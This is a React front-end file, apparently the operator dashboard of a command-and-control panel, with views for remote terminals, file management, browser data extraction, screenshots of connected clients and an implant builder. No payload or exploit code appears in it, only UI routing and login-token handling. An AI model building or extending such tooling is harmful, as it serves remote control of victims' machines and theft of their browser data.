import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import { ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

import Header from './components/Header';
import Login from './components/Login';
import Sidebar from './components/Sidebar';
import Dashboard from './components/Dashboard';
import SessionView from './components/SessionView';
import Terminal from './components/Terminal';
import FileManager from './components/FileManager';
import BrowserExtractor from './components/BrowserExtractor';
import Screenshots from './components/Screenshots';
import UserManagement from './components/UserManagement';
import ImplantBuilder from './components/ImplantBuilder';

import { useSocket } from './hooks/useSocket';
import { useClients } from './hooks/useClients';

function App() {
  const [sidebarOpen, setSidebarOpen] = useState(true);
  const [currentView, setCurrentView] = useState('dashboard');
  const [selectedClient, setSelectedClient] = useState(null);
  const [selectedSession, setSelectedSession] = useState(null);
  const [token, setToken] = useState(() => {
    const next = localStorage.getItem('fahis_token');
    if (next) return next;
    const legacy = localStorage.getItem('c2_token');
    if (legacy) {
      localStorage.setItem('fahis_token', legacy);
      localStorage.removeItem('c2_token');
      return legacy;
    }
    return '';
  });

  const socket = useSocket(token);
  const { clients, loading, error } = useClients(socket);

  const toggleSidebar = () => {
    setSidebarOpen(!sidebarOpen);
  };

  const handleClientSelect = (client) => {
    setSelectedClient(client);
    setCurrentView('session');
  };

  const handleSessionSelect = (session) => {
    setSelectedSession(session);
    setSelectedClient(session);
    setCurrentView('session');
  };

  const renderCurrentView = () => {
    switch (currentView) {
      case 'dashboard':
        return (
          <Dashboard
            clients={clients}
            onSessionSelect={handleSessionSelect}
            onDeleteSession={(client) => {
              try {
                if (socket && typeof socket.emit === 'function') {
                  socket.emit('deleteClient', { clientId: client.id });
                }
              } catch (e) {}
              if (selectedSession?.id === client.id) {
                setSelectedSession(null);
                setSelectedClient(null);
                setCurrentView('dashboard');
              }
            }}
          />
        );
      case 'session':
        return <SessionView 
          session={selectedSession} 
          onBack={() => setCurrentView('dashboard')}
          socket={socket}
        />;
      case 'terminal':
        return <Terminal client={selectedClient} socket={socket} />;
      case 'files':
        return <FileManager client={selectedClient} socket={socket} />;
      case 'browser':
        return <BrowserExtractor client={selectedClient} socket={socket} />;
      case 'screenshots':
        return <Screenshots client={selectedClient} socket={socket} />;
      case 'builder':
        return <ImplantBuilder />;
      case 'users':
        return <UserManagement />;
      default:
        return (
          <Dashboard
            clients={clients}
            onSessionSelect={handleSessionSelect}
            onDeleteSession={(client) => {
              try {
                if (socket && typeof socket.emit === 'function') {
                  socket.emit('deleteClient', { clientId: client.id });
                }
              } catch (e) {}
            }}
          />
        );
    }
  };

  if (!token) {
    return <Login onLoggedIn={(t) => setToken(t)} />;
  }

  return (
    <Router>
      <div className="App">
        <Header 
          onToggleSidebar={toggleSidebar}
          sidebarOpen={sidebarOpen}
          currentView={currentView}
          selectedClient={selectedClient}
          onLogout={() => {
            try { localStorage.removeItem('fahis_token'); } catch (e) {}
            setToken('');
          }}
        />
        
        <div className="main-content" style={{ display: 'flex', height: 'calc(100vh - 64px)', marginTop: '64px' }}>
          <Sidebar 
            open={sidebarOpen}
            currentView={currentView}
            onViewChange={setCurrentView}
            clients={clients}
            onSessionSelect={handleSessionSelect}
          />
          
          <main 
            className="content-area"
            style={{
              flex: 1,
              padding: '20px',
              overflow: 'auto',
              backgroundColor: 'transparent',
              transition: 'margin-left 0.28s ease',
              marginLeft: sidebarOpen ? 260 : 0
            }}
          >
            {renderCurrentView()}
          </main>
        </div>

        <ToastContainer
          position="top-right"
          autoClose={5000}
          hideProgressBar={false}
          newestOnTop={false}
          closeOnClick
          rtl={false}
          pauseOnFocusLoss
          draggable
          pauseOnHover
          theme="dark"
        />
      </div>
    </Router>
  );
}

export default App;